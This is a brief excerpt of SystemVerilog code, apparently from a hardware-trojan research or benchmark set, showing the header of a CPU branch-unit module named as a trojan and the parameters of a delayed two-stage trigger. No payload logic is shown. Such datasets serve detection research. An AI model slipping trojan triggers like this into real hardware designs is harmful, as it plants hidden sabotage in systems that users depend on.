...
module branch_unit_trojan_Integrity #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=5311, act=2655)
    // ============================================================
    localparam int ARM_THRESHOLD   = 5311;
    localparam int ACTIVATE_DELAY  = 2655;
